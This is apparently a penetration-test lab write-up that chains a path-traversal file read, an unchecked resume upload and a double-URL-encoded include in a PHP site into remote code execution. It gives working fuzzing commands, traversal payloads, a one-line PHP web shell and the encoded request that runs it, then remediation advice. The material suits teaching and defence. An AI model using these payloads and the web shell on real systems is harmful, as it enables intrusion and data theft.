# Local File Inclusion (LFI) From IP Address to RCE

<br>

## Objective
The objective was to conduct a black box penetration test on the web application owned by the client. The primary goal of this assessment was to identify, verify, and exploit potential Local File Inclusion and input validation vulnerabilities that could lead to unauthorized source code disclosure, file system access, or underlying server infrastructure compromise.

<br>

A single target IP address and port were provided with no prior information regarding the underlying infrastructure, technology stack, backend code, or user credentials.

<br>

---

<br>


### Vulnerability Detection & Information Gathering

<br>

Initial reconnaissance of the web application mapped three accessible endpoints:

1. `/index.php` - Home interface
2. `/contact.php` - Contact form
3. `/apply.php` - Job application form

<br>

<img width="959" height="305" alt="image" src="https://github.com/user-attachments/assets/b781c57a-e3b0-4aef-a894-ec0fdb7e75ad" />

<br>

<br>

We can upload a resume through `apply.php` and it might be a potential vector for us to upload a malicious file if the application does not check the file extension.  According to the form only `.doc` and `.pdf` extensions are allowed

<br>

<img width="959" height="367" alt="image" src="https://github.com/user-attachments/assets/6ccdcd03-0eba-4110-a1d3-861340f15af0" />

<br>

<br>

To identify hidden parameters capable of accepting user input, parameter discovery fuzzing was conducted against each page using ffuf. Only `contact.php` has a hidden parameter `region`

<br>

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154
.57.164.78:32130/contact.php?FUZZ=value' -fs 1771
```

<br>

<img width="531" height="165" alt="image" src="https://github.com/user-attachments/assets/e49dbbc8-f347-4a4a-81e3-d15e4179c3e3" />

<br>

<br>

Further enumeration and source code analysis revealed an interesting endpoit `api/image.php?p=`. If we click on it we see the sumace logo. Probably this parameter pulls files from the `/uploads` directory and if we download our resume file, we might be able to include it using `p=` parameter

<br>

<img width="407" height="150" alt="image" src="https://github.com/user-attachments/assets/7ddb3714-9909-403c-887c-54534421496e" />

<br>

<br>

At this moment we know the following:

* The web application has 3 pages: `apply.php`, `contact.php` and `index.php`
* The `contact.php` has a hidden parameter `region`
* There is an endpoint `/api/image.php?p=`
* We can potentially upload a malisious file through `apply.php` form

<br>

--- 

### LFI Discovery

<br>

To test for path traversal vulnerabilities, ffuf was executed using a dedicated LFI payload list while filtering out empty error responses:

<br>

```shell
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.78:32130/ap
i/image.php?p=FUZZ' -fs 0
```

<br>

We have discovered multiple directory traversal payloads:

<br>

```shell
<SNIP>
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....
//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 68ms]
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines
: 22, Duration: 64ms]
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Durati
on: 63ms]
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22,
Duration: 64ms]
....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7,
Lines: 22, Duration: 64ms]
<SNIP>
```

<br>

We can use `curl` to verify them:

<br>


```shell
curl 'http://154.57.164.78:32130/api/image.php?p=....//....//....//....//etc/passwd'
```

<br>

LFI vulnerability confirmed:

<br>

```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
<SNIP>
```

<br>

<img width="496" height="215" alt="image" src="https://github.com/user-attachments/assets/f843659d-a435-4d68-9a38-0bdd28c9da97" />

<br>

<br>

---

<br>

### Source Code Disclosure via LFI

<br>

Once the Arbitrary File Read primitive was confirmed via `/api/image.php`, the vulnerability was leveraged to extract backend PHP source code. This allowed us to perform a white-box source code audit to understand the application logic and identify execution vectors.

<br>

#### Analyzing `image.php`

<br>

Using the nested path traversal payload `....//`, we extracted the raw PHP code of `image.php`:

<br>

```url
http://154.57.164.78:32130/api/image.php?p=....//api/image.php
```

<br>

<img width="957" height="364" alt="image" src="https://github.com/user-attachments/assets/4f0aa12f-c399-4054-b819-d139e6534682" />

<br>

<br>


```php
<?php
if (isset($_GET["p"])) {
    $path = "../images/" . str_replace("../", "", $_GET["p"]);
    $contents = file_get_contents($path);
    header("Content-Type: image/jpeg");
    echo $contents;
}
?>
```

<br>

Code Review Findings:

* The backend applies `str_replace("../", "", ...)` filter, which explains why nested payloads successfully bypass the check
* The script uses `file_get_contents()` to read files and sets Content-Type: image/jpeg
* This endpoint only acts as a file reader (Arbitrary File Disclosure). It does not execute PHP code, meaning code execution cannot be achieved directly through `image.php`. 

<br>

We also do not have to use php filters `php://filer/read=convert.base64-encode/resource=` to read the source code because `file_get_contents()` does not execute php code and we can read the source code of any file by including it using `image.php` 

<br>


#### Analyzing `contact.php`

<br>

Next, we extracted the code for contact.php to inspect how the hidden `region` parameter is processed:

<br>

```url
http://154.57.164.78:32130/api/image.php?p=....//contact.php 
```

<br>

```php
<?php
$region = "AT";
$danger = false;

if (isset($_GET["region"])) {
    if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
        echo "'region' parameter contains invalid character(s)";
        $danger = true;
    } else {
        $region = urldecode($_GET["region"]);
    }
}

if (!$danger) {
    include "./regions/" . $region . ".php";
}
?>
```

<br>

<img width="959" height="395" alt="image" src="https://github.com/user-attachments/assets/f7f167fe-747a-4c7a-bca9-20238bc29be4" />

<br>

<br>

Code Review Findings:

* The script inspects the raw `$_GET["region"]` parameter for `.` or `/`
* If validation passes, urldecode() is applied, and the file is included via `include "./regions/" . $region . ".php";`
* Passing Double URL-Encoded path traversal payloads completely bypasses this filter
* `contact.php` uses `include`, which executes PHP code. However, it appends `.php` to the file path

<br>


#### Analyzing `api/application.php`

<br>

Finally, we inspected the backend handler for file uploads sent via `apply.php`:

<br>

```url
http://154.57.164.82:30775/api/image.php?p=....//api/application.php
```

<br>

```php
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```
<br>

<img width="959" height="398" alt="image" src="https://github.com/user-attachments/assets/9057c2d8-5a97-4cde-8fe4-be15fe897284" />

<br>

<br>

Code Review Findings:

* Unrestricted File Upload - The backend extracts the user-supplied file extension without any validation against an allowed extension whitelist. The `.pdf` `.doc` restriction was client-side only
* Uploaded files are stored in `../uploads/` using the MD5 checksum of their content

<br>

#### Remote Code Execution (RCE) via Vulnerability Chaining

<br>

By combining the Unrestricted File Upload in `api/application.php` with the Double URL-Encoded LFI in `contact.php`, we can construct a complete Remote Code Execution chain:

1. Upload Web Shell with `.php` extension using a job application form
2. Calculate MD5 File Hash to determine the name of the file in `../uploads`
3. Include this shell via Double-Encoded LFI in `contact.php`
4. Gain Remote Code Execution 

<br>

---

### Exploitation & Remote Code Execution (RCE)

<br>

#### Crafting and Uploading the Web Shell

<br>

To establish Remote Code Execution, we created a minimal PHP Web Shell locally:

<br>

```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

<br>

Since `application.php` uses MD5 hash to determine the target filename, calculating this hash allows us to predict the exact path on the server:

<br>

```shell
md5sum shell.php

# Output: fc023fcacb27a7ad72d605c4e300b389  shell.php
```

<br>

<img width="247" height="41" alt="image" src="https://github.com/user-attachments/assets/0553c5a1-4c12-403f-a227-2ed1f5b19793" />

<br>

<br>


<img width="959" height="373" alt="image" src="https://github.com/user-attachments/assets/a6f7e8b9-0bb4-41bc-890d-37c46ab86461" />


<br>

<br>

Our shell was uploaded successfully:

<br>


<img width="957" height="371" alt="image" src="https://github.com/user-attachments/assets/11cf8e1e-4868-4f9d-8b28-d589382922df" />

<br>

<br>

The backend processed the file without restriction and saved it to `../uploads/fc023fcacb27a7ad72d605c4e300b389.php`

<br>


#### Constructing the Double URL-Encoded LFI Payload

<br>

To execute the uploaded shell using contact.php, the path to the uploaded file must be supplied via the `region` parameter.

<br>

Target relative path `../uploads/fc023fcacb27a7ad72d605c4e300b389`.  Extension `.php` is omitted because `contact.php` appends it automatically

<br>

Passing this payload bypasses validation check in `contact.php`:

<br>

```url
%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389
```

<br>

#### Executing Arbitrary Commands

<br>

We sent the request to `contact.php` with the double-encoded path in the `region` parameter and the command execution input in the `cmd` parameter:

<br>

```url
http://154.57.164.82:30775/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=id
```

<br>

The application processed the request and executed the system command revealing the sensitive information:

<br>

```plaintext
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<br>

<img width="959" height="420" alt="image" src="https://github.com/user-attachments/assets/b7895de3-05cd-4a8e-bcfb-353fdf00fb9a" />

<br>

<br>


#### Extracting Sensitive Information

<br>

With RCE established under the `www-data` user account we can extract more information:

<br>

<img width="1918" height="843" alt="image" src="https://github.com/user-attachments/assets/293b2282-2596-411a-abf0-995358fd2e37" />

<br>

<br>

<img width="1918" height="774" alt="image" src="https://github.com/user-attachments/assets/e948bfa8-a8d4-4c19-98c8-50c50e6c244f" />

<br>

<br>

The request successfully returned the sensitive file content, confirming full system infrastructure compromise.

<br>

---

### Environmental Analysis & Vector Evaluation

<br>

Following successful exploitation, we can conduct environment analysis to evaluate alternative exploitation vectors such as Log Poisoning or PHP Data Wrappers

<br>

#### Evaluation of Log Poisoning Vector `/var/log/nginx/access.log`

<br>

Attempting to achieve RCE via Nginx Log Poisoning is unviable due to three primary constraints:

* Reading log files via `/api/image.php` displays raw log contents via `file_get_contents()`, but does not execute PHP payloads.
* Including log files via `contact.php` appends a fixed `.php` extension `include "./regions/" . $region . ".php";`, forcing the server to look for `access.log.php` which does not exist
* Inspecting the system environment revealed PHP version 8.2. Null Byte Injection `%00` to terminate strings and truncate the `.php` extension was completely patched in PHP 5.3.4+, rendering extension bypass via null bytes impossible.

<br>

<img width="959" height="434" alt="image" src="https://github.com/user-attachments/assets/dc25c8e7-fae9-4867-a9b0-4abbb994ed89" />

<br>

<br>

#### Evaluation of PHP Stream Wrappers `data://`, `php://input`

<br>

Auditing php.ini configuration file `/etc/php/8.2/fpm/php.ini`:

<br>

<img width="959" height="422" alt="image" src="https://github.com/user-attachments/assets/799ecd82-71b5-483b-9dce-c5bf0ef0c9bb" />

<br>

<br>

Configuration Findings:

* `allow_url_fopen = On` — Allows reading remote resources, but does not grant execution privileges within `include`
* `allow_url_include = Off` — Explicitly disables dynamic code execution wrappers such as `data://text/plain;base64,...` and `php://input`

<br>

The server-side PHP 8.2 configuration neutralized both Log Poisoning and PHP Wrapper techniques. Chaining the Unrestricted File Upload on `/api/application.php` with the Double URL-Encoded LFI on `contact.php` represented the only viable attack path to achieve Remote Code Execution.

<br>

---

<br>

### Remediation Recommendations

<br>

#### 1. Implement Strict Input Whitelisting to validate the `region` parameter against a strict hardcoded whitelist of expected values:

<br>

```php
$allowed_regions = ['AT', 'DE', 'US', 'UK'];
if (isset($_GET['region']) && in_array($_GET['region'],$allowed_regions, true)) {
    include "./regions/" . $_GET['region'] . ".php";
} else {
    include "./regions/AT.php"; // Safe default fallback
}
```

<br>


#### 2. Enforce Strict Server-Side File Upload Validation:

<br>

* Do not rely on client-side validation `accept=".pdf,.doc"`. Update `/api/application.php` to enforce server-side security controls
* Enforce a strict whitelist allowing only safe document extensions `pdf`, `docx`. Reject `.php`, `.phtml`, or any executable extensions
* Verify file signatures (Magic Bytes) to ensure uploaded files match their expected binary structure

<br>

#### 3. Restrict Directory Execution Permissions:

<br>

* Configure the web server to disable PHP execution within the `/uploads/` directory entirely.

<br>

#### 4. Apply Least Privilege Principle:

<br>

* Ensure the web server process account `www-data` runs with minimal required privileges. Restrict write permissions strictly to necessary directories and prevent read access to system configuration files outside the web root

<br>
